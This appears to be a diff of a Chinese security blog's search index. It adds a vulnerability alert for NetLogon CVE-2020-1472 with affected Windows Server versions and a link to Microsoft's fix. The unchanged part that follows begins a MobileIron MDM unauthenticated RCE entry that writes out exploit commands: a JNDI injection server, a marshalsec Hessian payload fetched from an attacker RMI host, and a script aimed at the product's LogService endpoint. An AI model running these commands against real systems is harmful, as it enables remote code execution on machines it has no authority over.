@@ -1,6 +1,35 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>NetLogon特权提升漏洞(CVE-2020-1472)</title>
+    <url>/2020/09/15/NetLogon%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E(CVE-2020-1472)/</url>
+    <content><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>NetLogon组件 是 Windows 上一项重要的功能组件，用于用户和机器在域内网络上的认证，以及复制数据库以进行域控备份，同时还用于维护域成员与域之间、域与域控之间、域DC与跨域DC之间的关系。当攻击者使用 Netlogon 远程协议 (MS-NRPC) 建立与域控制器连接的易受攻击的 Netlogon 安全通道时，存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络中的设备上运行经特殊设计的应用程序。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
+<li>Windows Server 2008 R2 for x64-based Systems Service Pack 1</li>
+<li>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</li>
+<li>Windows Server 2012</li>
+<li>Windows Server 2012 (Server Core installation)</li>
+<li>Windows Server 2012 R2</li>
+<li>Windows Server 2012 R2 (Server Core installation)</li>
+<li>Windows Server 2016 </li>
+<li>Windows Server 2016 (Server Core installation)</li>
+<li>Windows Server 2019</li>
+<li>Windows Server 2019 (Server Core installation)</li>
+<li>Windows Server, version 1903 (Server Core installation)</li>
+<li>Windows Server, version 1909 (Server Core installation)</li>
+<li>Windows Server, version 2004 (Server Core installation)</li>
+</ul>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><img src="0.png" alt="0"></p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1472" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1472</a></p>
+]]></content>
+      <categories>
+        <category>漏洞告警</category>
+      </categories>
+      <tags>
+        <tag>漏洞利用</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MobileIronMDM 未授权RCE</title>
     <url>/2020/09/15/MobileIronMDM%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE/</url>
     <content><![CDATA[<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT-all.jar -A <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> -C "&lt;Command&gt;"</span><br><span class="line">java -cp ./marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-all.jar marshalsec.Hessian SpringAbstractBeanFactoryPointcutAdvisor rmi://&lt;server-ip&gt;:<span class="number">1099</span>/&lt;codebase&gt; &gt; exp</span><br><span class="line">python hessian.py -p exp -u 'https://mobileiron-mdm-instance/mifs/.;/services/LogService'</span><br></pre></td></tr></table></figure>
